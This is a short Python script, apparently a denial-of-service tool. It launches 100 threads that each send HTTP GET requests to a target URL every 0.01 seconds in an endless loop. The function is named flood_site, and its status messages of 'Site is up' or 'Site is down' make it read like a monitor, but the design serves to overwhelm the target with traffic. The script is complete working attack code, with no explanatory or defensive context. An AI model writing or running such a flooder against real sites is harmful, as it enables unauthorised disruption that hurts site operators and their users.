import requests
import threading
import time

def flood_site(url, interval, thread_id):
    while True:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"Thread {thread_id} - {time.ctime()} - Site is up")
            else:
                print(f"Thread {thread_id} - {time.ctime()} - Site is down (Status Code: {response.status_code})")
        except requests.exceptions.RequestException as e:
            print(f"Thread {thread_id} - {time.ctime()} - Error: {e}")
        time.sleep(interval)

def start_threads(url, interval, num_threads):
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=flood_site, args=(url, interval, i))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    url = "http://example.com"
    interval = 0.01  # Interval in seconds
    num_threads = 100  # Number of threads
    start_threads(url, interval, num_threads)
